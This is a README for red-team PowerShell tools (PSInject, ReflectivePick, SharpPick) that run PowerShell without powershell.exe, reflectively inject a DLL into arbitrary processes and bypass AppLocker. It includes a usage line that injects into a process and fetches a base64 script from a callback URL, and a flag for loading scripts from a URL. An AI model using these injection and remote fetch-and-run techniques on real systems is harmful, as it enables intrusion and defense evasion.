This project focuses on allowing the execution of Powershell functionality without the use of Powershell.exe. Primarily this project uses.NET assemblies/libraries to start execution of the Powershell scripts. 

Many thanks to those in the offensive powershell community. This work is not ground breaking but hopefully will motivate offense and defense to understand the implications and lack of protections available.

Of special note, many thanks to the following for their help/work in this project indirectly by being so awesome and coming up with awesome work:
Matt Graeber (@mattifestation)
Joe Bialek (@JosephBialek)
Lee Christensen (@tifkin_)
Will Schroeder (@harmj0y)
Stark

## PSInject.ps1
This project provides a powershell scipt (psinject.ps1) which implements the Invoke-PSInject function. This script is based off Powersploit's Invoke-ReflectivePEInjection and reflectively injects the ReflectivePick DLL. It allows for the replacement of the callback URL that is hard coded into the DLL. See this script for more details. 

The script that it calls back for must be base64 encoded. To do this, you can simply use the built in linux utility 'base64'. 

#### Example:
	import-module psinject.ps1
	Invoke-PSInject -Verbose -ProcID 0000 -CBURL http://1.1.1.1/favicon.ico

## ReflectivePick
This project is a reflective DLL based on Stephen Fewer's method. It imports/runs a .NET assembly into its memory space that supports the running of Powershell code using System.Management.Automation. Due to its' reflective property, it can be injected into any process using a reflective injector and allows the execution of Powershell code by any process, not just Powershell.exe. It extends inject/migrate capabilities into powershell. 

This DLL is meant to be used with PSInject.ps1 which provide the ability to modify the hardcoded callback URL or with Metasploit after compiling or patching the URL manually.

## SharpPick
This project is a .NET executable which allows execution of Powershell code through a number of methods. The script can be embedded as a resource, read from a url, appeneded to the binary, or read from a file. It was originally used as a proof of concept to demonstrate/test the blocking of powershell and bypass of applocker.

#### Man Page
	sharppick.exe [<flag> <argument>]
	flags:
	-f <file> : Read script from specified file
	-r <resource name> : Read script from specified resource
	-d <url> : Read script from URL
	-a <delimeter> : Read script appended to current binary after specified delimeter. Delimeter should be very very unique string

More SharpPick details [here](http://sixdub.net/2014/12/inexorable-powershell-a-red-teamers-tale-of-overcoming-simple-applocker-policies/)

Developed by [@sixdub](https://twitter.com/sixdub)

Part of Veil's [PowerTools](https://github.com/Veil-Framework/PowerTools)
